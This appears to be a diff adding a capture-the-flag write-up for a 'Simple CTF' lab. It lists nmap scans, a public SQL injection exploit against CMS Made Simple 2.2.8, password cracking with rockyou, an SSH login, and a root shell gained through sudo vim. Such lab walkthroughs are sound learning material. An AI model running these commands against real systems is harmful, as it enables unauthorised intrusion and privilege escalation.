@@ -1,0 +1,27 @@
+Simple CTF (MrSeth6797) Write Up
+by Migue27au
+
+1. Enumeration
+	1.1. nmap to all ports --> nmap -p- <targetIP> -n -T5 -oN all-ports.txt --open
+		ports 21, 80 and 2222
+	1.2. nmap to target ports --> nmap -p21,80,2222 <targetIP> -n -T5 -sC -sV -oN target-ports.txt
+	1.3. searching the web page to find something interesting...
+		use CMS made simple 2.2.8
+2. Access
+	2.1. Search exploit for CMS made simple 2.2.8 --> searchsploit CMS made simple 2.2.8
+		CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
+	2.2. Download exploti --> searchsploit -m php/webapps/46635.py
+	2.3. Use exploit --> python sqli.py -u http://10.10.161.192/simple -w /home/kali/dictionary/rockyou.txt --crack
+		user: mitch
+		Password: 0c01f4468bd75d7a84c7eb73846e8d96
+		Password cracked: secret
+	2.4. Connect with ssh --> ssh mitch@<targetIP> -p 2222
+	2.5. Get user flag --> cat ~/user.txt
+3. Privilege Scalation
+	3.1. Look privileges --> sudo -l
+
+	3.2. vim allow without password
+		- sudo vim
+		- :set shell=/bin/bash
+		- :shell
+	3.3. get root flag --> cat /root/root.txt
